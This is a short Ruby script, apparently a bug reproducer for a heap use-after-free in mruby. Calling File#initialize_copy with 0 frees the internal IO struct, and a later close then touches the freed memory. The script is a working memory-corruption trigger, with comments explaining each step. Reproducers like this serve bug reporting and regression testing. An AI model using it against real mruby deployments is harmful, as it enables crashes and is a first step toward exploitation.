# Create a valid File object (which allocates a struct mrb_io in DATA_PTR)
f = File.new("/dev/null")

# Call initialize_copy with an invalid argument (0)
# This will free the DATA_PTR(f) and then raise a TypeError when io_get_open_fptr is called on 0.
begin
  f.initialize_copy(0)
rescue TypeError
  # The TypeError is caught, but DATA_PTR(f) remains a dangling pointer to the freed mrb_io!
end

# Attempt to close the file. This calls fptr_finalize, which reads/writes to the freed pointer,
# triggering a heap-use-after-free!
f.close
